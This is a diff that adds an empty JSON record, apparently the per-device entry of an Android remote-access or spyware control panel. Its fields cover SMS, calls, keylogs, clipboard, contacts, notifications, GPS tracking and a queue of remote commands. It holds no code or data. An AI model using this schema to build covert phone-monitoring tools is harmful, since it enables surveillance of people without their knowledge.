@@ -1,0 +1,20 @@
+{
+  "clientID": "986812b4e2fc833e",
+  "CommandQue": [],
+  "SMSData": [],
+  "CallData": [],
+  "KeyLogData": [],
+  "contacts": [],
+  "wifiNow": [],
+  "wifiLog": [],
+  "clipboardLog": [],
+  "notificationLog": [],
+  "enabledPermissions": [],
+  "apps": [],
+  "GPSData": [],
+  "GPSSettings": {
+    "updateFrequency": 0
+  },
+  "downloads": [],
+  "currentFolder": []
+}
